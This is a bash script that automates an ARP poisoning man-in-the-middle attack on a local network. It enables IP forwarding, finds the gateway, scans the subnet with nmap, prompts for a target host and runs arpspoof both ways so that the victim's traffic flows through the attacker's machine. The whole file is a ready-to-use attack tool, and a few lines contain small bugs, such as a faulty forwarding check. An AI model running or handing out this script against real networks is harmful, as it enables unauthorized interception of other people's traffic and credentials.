#! /bin/bash

############################################
#check to verify IP_Forwarding is set to TRUE
IPFORWARDING=`cat /proc/sys/net/ipv4/ip_forward`
if [ "IPFORWARDING" != "1" ]
then
echo 1 >> /proc/sys/net/ipv4/ip_forward
fi
############################################

echo
echo "**************************************"
echo "Gathering Information for ARP Spoof..."


VALIDINTERFACE="0"

while [ "$VALIDINTERFACE" == 0 ];do
echo
echo "Name of Network Interface:"
read INTERFACE

CHECKINTERFACE=`ifconfig $INTERFACE`
if [ "$CHECKINTERFACE" ]
then
break
fi
done

echo
echo "Finding Default Gateway..."

#Gateway is used as the router target for spoof
GATEWAY=`route -n |grep UG |cut -d" " -f10`

echo "Gateway Address: $GATEWAY"
echo

echo "Finding Subnet Mask..."
MASK=`ifconfig |grep inet |grep -v inet6 |grep -v 127.0.0.1 |cut -d":" -f4`

echo "Subnet Mask is: $MASK"
echo

if [ "$MASK" = "255.255.255.0" ]
then

NETWORK=`route -n |grep UG |cut -d" " -f10 |cut -b1-9`

echo "Scanning for Live Hosts..."
HOSTS=`nmap -sn $NETWORK.1-254 |grep report`

if [ "$HOSTS" ]
then

echo "***************************"
echo "List of Live Hosts:"
echo

############################################
#Define Original IFS, New IFS
OIFS="$IFS"
NIFS=$'\n'
IFS="$NIFS"
############################################

for host in $HOSTS;do
IFS="$OIFS"
echo $host #Note that this will likely print the address of the default gateway also
IFS="$NIFS"
done

IFS="$OIFS"

echo
echo "***************************"
echo "Enter IP of Desired Target:"
read TARGET

echo
echo "*****************************************"
echo "Initiating ARP Poisoning for $TARGET"
echo

arpspoof -i $INTERFACE -t $GATEWAY $TARGET &
arpspoof -i $INTERFACE -t $TARGET $GATEWAY &

echo
echo "ARP Poisoning Complete"
echo

read

echo "********************"
echo "Ending ARP Poisoning"
killall arpspoof
sleep 2
echo
echo "*******************"
echo "ARP Poisoning Ended"

################################################
#else statements for Target not NULL conditional
else
echo
echo "No Live Hosts Available"
fi

#else statements for MASK not 255.255.255.0 conditional
else
echo "Subnet Mask Error!"
echo "Exiting"
fi
